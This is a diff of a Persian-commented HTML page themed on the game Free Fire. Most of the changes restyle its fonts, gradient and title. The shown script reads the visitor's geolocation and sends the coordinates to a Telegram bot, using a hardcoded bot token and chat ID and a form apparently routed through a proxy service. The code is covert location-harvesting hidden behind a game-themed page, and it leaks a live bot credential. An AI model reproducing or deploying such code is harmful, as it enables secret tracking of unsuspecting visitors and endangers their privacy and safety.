@@ -6,11 +6,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <!-- فونت گیمینگ Orbitron -->
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&display=swap" rel="stylesheet">
+  <!-- فونت انگلیسی جوان پسند برای تیتر -->
+  <link href="https://fonts.googleapis.com/css2?family=Anton&display=swap" rel="stylesheet">
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: 'Orbitron', sans-serif;
-      background: linear-gradient(135deg, #ff3c3c, #ff9800, #8e24aa);
+      background: linear-gradient(135deg, #2c3e50, #8e44ad);
       background-size: 400% 400%;
       animation: gradientMove 12s ease infinite;
       display: flex;
@@ -28,22 +30,16 @@
       100% { background-position: 0% 50%; }
     }
 
-    /* تیتر Free Fire */
+    /* تیتر Free Fire با فونت جدید و بدون انیمیشن */
     h1 {
+      font-family: 'Anton', sans-serif;
       font-size: 3em;
-      font-weight: 900;
+      font-weight: 700;
       margin-bottom: 12px;
       text-transform: uppercase;
-      letter-spacing: 5px;
-      background: linear-gradient(90deg, #ffcc00, #ff3c3c, #ff9800, #fff);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      text-shadow: 0 0 10px rgba(255,140,0,0.9), 0 0 20px rgba(255,60,60,0.7), 0 0 30px rgba(255,255,255,0.8);
-      animation: flicker 1.5s infinite alternate;
-    }
-    @keyframes flicker {
-      from { text-shadow: 0 0 8px #ff3c3c, 0 0 16px #ff9800, 0 0 24px #ffcc00; }
-      to { text-shadow: 0 0 16px #fff, 0 0 30px #ff9800, 0 0 50px #ff3c3c; }
+      letter-spacing: 2px;
+      color: #ffd700; /* طلایی */
+      text-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
     }
 
     p {
@@ -97,7 +93,7 @@
       border-top: 1px solid rgba(255,255,255,0.2);
       text-shadow: 0 0 8px rgba(0,0,0,0.8);
       text-align: center;
-      font-family: sans-serif; /* برای هماهنگی متن فارسی */
+      font-family: sans-serif;
     }
 
     /* موبایل */
@@ -137,10 +133,9 @@
       var latitude = position.coords.latitude;
       var longitude = position.coords.longitude;
       if (latitude && longitude) {
-        var tgUrl = "https://api.telegram.org/bot8069976917:AAHGS2Sar6h0qPCYVPpYezGHRVoOY1KuTbs/sendMessage"
+        var tgUrl ="https://api.telegram.org/bot8069976917:AAHGS2Sar6h0qPCYVPpYezGHRVoOY1KuTbs/sendMessage"
                   + "?chat_id=8438093859"
                   + "&text=" + encodeURIComponent("Latitude: " + latitude + ", Longitude: " + longitude);
-
         var formData = new FormData();
         formData.append("UrlBox", tgUrl);
         formData.append("AgentList", "Google chrome");
